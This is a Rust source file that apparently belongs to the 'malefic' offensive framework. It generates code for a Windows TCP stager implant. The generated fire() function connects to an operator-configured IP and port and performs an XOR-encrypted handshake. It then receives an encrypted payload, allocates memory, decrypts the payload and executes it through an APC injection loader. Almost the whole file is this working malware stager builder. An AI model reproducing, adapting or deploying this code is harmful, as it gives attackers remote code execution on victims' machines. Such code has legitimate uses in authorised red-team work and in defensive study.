use crate::{win::PANIC, GenerateArch, Pulse, Version};

use super::{djb2_hash, utils::{TARGET_SOURCE_PATH, X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY}};

static X86_DEPENDENCIES: &str = "
use malefic_win_kit::asm::arch::x86::{
    memory::{
        _convert_lebytes_to_u32, 
        _memcpy, 
        _memset, 
        _virtual_alloc
    }, 
    tcp::{
        bind_and_connect,
        send_std,
        recv_std
    },
    crypto::xor_process,
    apc::inline_apc_loader, 
};";

static X64_DEPENDENCIES: &str = "
use malefic_win_kit::asm::arch::x64::{
    memory::{
        _convert_lebytes_to_u32, 
        _memcpy, 
        _memset, 
        _virtual_alloc
    }, 
    tcp::{
        bind_and_connect,
        send_std,
        recv_std
    },
    crypto::xor_process,
    apc::inline_apc_loader, 
};";

static PREBUILD_DEPENDENCIES: &str = r#"
#[link(name = "malefic_win_kit_pulse", kind = "static")]
extern "C" {
    pub fn bind_and_connect(
        dll_name: *const u8, 
        ip: *const u8, 
        port: u16
    ) -> usize;
    pub fn send_std(
        socket: usize,
        buf: usize,
        len: usize 
    ) -> usize;
    pub fn recv_std(
        socket: usize,
        buf: usize,
        len: usize,
    ) -> usize;
    pub fn xor_process(
        data: *mut u8, 
        data_len: usize, 
        key: *const u8, 
        key_len: usize, 
        iv: *const u8, 
        iv_len: usize, 
        counter: *mut usize
    );
    pub fn _virtual_alloc(
        _address: *mut u8,
        _size: usize,
        _alloc_type: u32,
        _protect: u32
    ) -> *mut u8;
    pub fn _memcpy(
        _dst: *mut u8,
        _src: *const u8,
        _size: usize,
    );
    pub fn _memset(
        _dst: *mut u8,
        _value: u8,
        _size: usize,
    );
    pub fn _convert_lebytes_to_u32(
        _bytes: *const u8,
    ) -> u32;
    pub fn inline_apc_loader(bin: usize, len: usize) -> usize;
}
"#;



pub fn generate_tcp_pulse(
    config: Pulse,
    arch: GenerateArch,
    version: &Version,
    source: bool
) -> anyhow::Result<()> {
    generate_stage_template(config, arch, version, source)
}

fn generate_stage_template(
    config: Pulse,
    arch: GenerateArch,
    version: &Version,
    source: bool,
) -> anyhow::Result<()> {
    let mut dependencies = PREBUILD_DEPENDENCIES;
    let main_template_path;
    let make_body;
    match arch {
        GenerateArch::X64 => {
            if source {
                dependencies = X64_DEPENDENCIES;
            }
            main_template_path = X64_MAIN_TEMPLATE_PATH;
            make_body = X64_MAKE_BODY;
        },
        GenerateArch::X86 => {
            if source {
                dependencies = X86_DEPENDENCIES;
            }
            main_template_path = X86_MAIN_TEMPLATE_PATH;
            make_body = X86_MAKE_BODY;
        }
    }
    make_source_code(
        dependencies, main_template_path, make_body, config, version, source)
}

fn make_source_code(
    dependencies: &str,
    main_template_path: &str,
    make_body: &str,
    config: Pulse,
    _version: &Version,
    source: bool,
) -> anyhow::Result<()> {
    let main_template_path = std::path::Path::new(main_template_path);
    if !main_template_path.exists() {
        anyhow::bail!("main_template_path does not exist.");
    }
    let main_template = std::fs::read_to_string(main_template_path)?;
    let mut final_data = format!("{}\n\n\n{}", main_template, dependencies);

    if !source {
        final_data = format!("{}\n\n\n{}\n", final_data, PANIC);
    }

    final_data = format!("{}\n\n\n{}", final_data, make_body);
    let url = &config.target;
    if url.is_empty() {
        anyhow::bail!("url is empty.");
    }
    let (ip, port) = url.split_at(url.find(":").unwrap());
    let magic = djb2_hash(&config.flags.magic);
    let key = &config.key;
    let iv = key.chars().rev().collect::<String>();

    let main_content = format!(
        r#"
#[no_mangle]
fn fire() {{
    let start = {start}u8;
    let end = {end}u8;
    let magic = {magic}u32;
    unsafe {{
        let mut body_buf: [u8;10] = core::mem::MaybeUninit::uninit().assume_init();
        _memset(body_buf.as_mut_ptr(), 0, 0xa);
        let socket = bind_and_connect(
            "ws2_32.dll\x00".as_ptr(), 
            "{ip}\x00".as_ptr(), 
            {port}
        );
        if socket.eq(&0) {{
            return;
        }}
        make_body(body_buf.as_mut_ptr(), start, end, magic, {artifact_id});
        let mut counter: usize = 0;
        xor_process(
            body_buf.as_mut_ptr(),
            10,
            "{key}".as_ptr(),
            {key_len},
            "{iv}".as_ptr(),
            {iv_len},
            &mut counter
        );
        let ret = send_std(socket, body_buf.as_ptr() as _, 0xa);
        if ret.eq(&0) {{
            return;
        }}
        _memset(body_buf.as_mut_ptr(), 0, 0xa);
        let mut offset: usize = 0;
        while offset.lt(&0x9) {{
            let ret = recv_std(socket, body_buf.as_ptr() as usize + offset, 0x9 - offset);
            if ret.eq(&0) || ret.eq(&0xffffffff) {{
                return;
            }}
            offset += ret as usize;
        }}
        if offset.gt(&0x9) {{
            return;
        }}
        counter = 0;
        xor_process(
            body_buf.as_mut_ptr(),
            9,
            "{key}".as_ptr(),
            {key_len},
            "{iv}".as_ptr(),
            {iv_len},
            &mut counter
        );
        if body_buf[0].ne(&start) {{
            return;
        }}
        let recv_magic = _convert_lebytes_to_u32(body_buf.as_ptr().add(1));
        let recv_len = _convert_lebytes_to_u32(body_buf.as_ptr().add(5));
        if recv_magic.ne(&magic) || recv_len.eq(&0) {{
            return;
        }}
        let ptr = _virtual_alloc(0 as _, recv_len as _, 0x1000, 0x4);
        if ptr.is_null() {{
            return;
        }}
        let ret = recv_std(socket, ptr as _, recv_len as _);
        if ret.eq(&0) {{
            return;
        }}
        xor_process(
            ptr as _,
            recv_len as _,
            "{key}".as_ptr(),
            {key_len},
            "{iv}".as_ptr(),
            {iv_len},
            &mut counter
        );
        inline_apc_loader(ptr as _, recv_len as _);
    }}
}}
    "#,
        start = config.flags.start,
        end = config.flags.end,
        magic = format!("0x{:x}", magic as u32),
        artifact_id = config.flags.artifact_id,
        ip = ip,
        port = port[1..].parse::<u16>()?,
        key = key,
        key_len = key.len(),
        iv = iv,
        iv_len = iv.len(),
    );

    final_data = format!("{}\n\n\n{}", final_data, main_content);
    let target_path = std::path::Path::new(TARGET_SOURCE_PATH);
    std::fs::write(target_path, final_data)?;

    Ok(())
}